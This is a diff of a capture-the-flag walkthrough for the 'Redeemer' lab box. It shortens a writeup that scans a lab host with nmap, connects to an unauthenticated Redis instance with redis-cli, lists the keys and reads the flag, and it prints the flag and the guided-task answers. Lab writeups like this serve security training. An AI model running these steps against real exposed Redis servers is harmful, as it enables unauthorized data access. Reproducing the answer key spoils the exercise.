@@ -1,73 +1,35 @@
 # Redeemer
 
-|            |                                                                          |
-|------------|--------------------------------------------------------------------------|
-| Track      | Starting Point - Tier 0                                                  |
-| Difficulty | Very Easy                                                                |
-| OS         | Linux                                                                    |
+|            |                                                                              |
+|------------|------------------------------------------------------------------------------|
+| Track      | Starting Point - Tier 0                                                      |
+| Difficulty | Very Easy                                                                    |
+| OS         | Linux                                                                        |
 | Tags       | Redis, Databases, Vulnerability Assessment, Reconnaissance, Anonymous Access |
-| Tools      | `nmap`, `redis-cli` (from `redis-tools`)                                 |
+| Tools      | `nmap`, `redis-cli` (from `redis-tools`)                                     |
 
 ## Summary
 
-An unauthenticated Redis 5.0.7 instance. Connect with `redis-cli`, find the
-`flag` key in db0, read it.
+Unauthenticated Redis 5.0.7. The trick is remembering Redis isn't really a
+"server you log into" - it's a command interface where the client just sends
+plain text commands, so anyone reachable on TCP/6379 with a working
+`redis-cli` is effectively root of the dataset.
 
-## Notes
-
-- Handy reference: [Redis Cheat Sheet](https://lzone.de/cheat-sheet/Redis)
-- `redis-cli` ships in the `redis-tools` package on Debian/Ubuntu.
-
-## Recon
-
-Full TCP scan:
+## Solve
 
 ```bash
 nmap -sT -p- --min-rate=3000 10.129.136.187
-```
+# 6379/tcp open  redis
 
-```
-PORT     STATE SERVICE
-6379/tcp open  redis
-```
-
-## Enumeration
-
-Pull server info to learn the version:
-
-```bash
-redis-cli -h 10.129.136.187 INFO | grep version
-```
-
-```
-redis_version:5.0.7
-gcc_version:9.3.0
-```
-
-## Foothold
-
-No auth required. Drop into an interactive session, select db0, list keys:
-
-```bash
 redis-cli -h 10.129.136.187
-10.129.136.187:6379> info keyspace
-# Keyspace
-db0:keys=4,expires=0,avg_ttl=0
-10.129.136.187:6379> select 0
-OK
-10.129.136.187:6379> keys *
+> select 0
+> keys *
 1) "flag"
 2) "temp"
 3) "stor"
 4) "numb"
-10.129.136.187:6379> get flag
+> get flag
 "03e1d2b376c37ab3f5319922053953eb"
-```
-
-## Flag
-
-```
-03e1d2b376c37ab3f5319922053953eb
 ```
 
 ## Guided Tasks
@@ -84,4 +46,3 @@ OK
 | 8  | Which command is used to select the desired database in Redis? | select |
 | 9  | How many keys are present inside the database with index 0? | 4 |
 | 10 | Which command is used to obtain all the keys in a database? | `keys *` |
-| Flag | Submit Root Flag | `03e1d2b376c37ab3f5319922053953eb` |
